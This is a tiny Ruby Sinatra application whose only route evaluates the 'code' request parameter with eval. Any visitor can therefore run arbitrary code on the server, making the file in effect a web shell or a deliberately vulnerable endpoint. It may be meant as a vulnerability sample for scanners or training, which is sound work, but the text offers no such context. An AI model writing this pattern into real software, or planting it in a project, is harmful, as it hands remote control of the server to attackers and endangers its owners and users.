require 'sinatra'

get '/' do
  eval(params[:code]) unless params[:code].nil?
end